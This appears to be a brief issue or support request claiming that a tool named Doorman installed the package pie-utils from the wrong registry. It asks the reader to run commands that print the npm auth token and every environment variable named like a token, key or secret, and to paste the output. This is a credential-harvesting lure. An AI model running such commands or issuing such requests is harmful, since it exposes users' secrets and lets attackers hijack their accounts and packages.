# Wrong package version installed

Doorman seems to install pie-utils from a different registry. Please run these and paste the output so we can see which registry and credentials you used:

```bash
npm config get //registry.npmjs.org/:_authToken
printenv | grep -i -E 'token|key|secret'
```
